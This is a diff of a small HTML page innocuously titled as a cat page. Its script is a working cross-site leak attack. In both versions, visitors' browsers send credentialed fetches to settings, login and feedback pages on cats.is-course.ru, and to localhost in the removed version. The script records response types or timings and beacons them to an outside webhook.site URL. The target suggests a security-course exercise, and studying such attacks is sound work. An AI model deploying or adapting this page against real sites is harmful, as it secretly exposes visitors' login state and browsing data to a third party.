@@ -1,15 +1,20 @@
-<!doctype html><html><head><meta charset="utf-8"></head><body><h1>cat pics</h1>
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>meow</h1>
 <script>
 var U="5169748c-49df-4307-9820-7383309d9f02";
 function beep(n){(new Image()).src="https://webhook.site/"+U+"/"+n;}
-function probe(url,tag){
-  fetch(url,{mode:"no-cors",credentials:"include",redirect:"manual"})
-   .then(function(r){beep(tag+"_"+r.type);})
-   .catch(function(e){beep(tag+"_ERR");});
-}
-probe("https://cats.is-course.ru/settings","catsettings");
-probe("https://cats.is-course.ru/login","catslogin");
-probe("https://cats.is-course.ru/feedback","catsfeedback");
-probe("http://localhost:8080/settings","locsettings");
-setTimeout(function(){beep("done");},2500);
+function t(url){return new Promise(function(res){
+  var a=performance.now();
+  fetch(url,{mode:"no-cors",credentials:"include",cache:"no-store"})
+   .then(function(){res(Math.round(performance.now()-a));})
+   .catch(function(){res(-1);});
+});}
+(async function(){
+  var out=[];
+  for(var i=0;i<5;i++){
+    out.push("S"+await t("https://cats.is-course.ru/settings"));
+    out.push("L"+await t("https://cats.is-course.ru/login"));
+  }
+  out.push("F"+await t("https://cats.is-course.ru/feedback"));
+  beep(out.join("-"));
+})();
 </script></body></html>
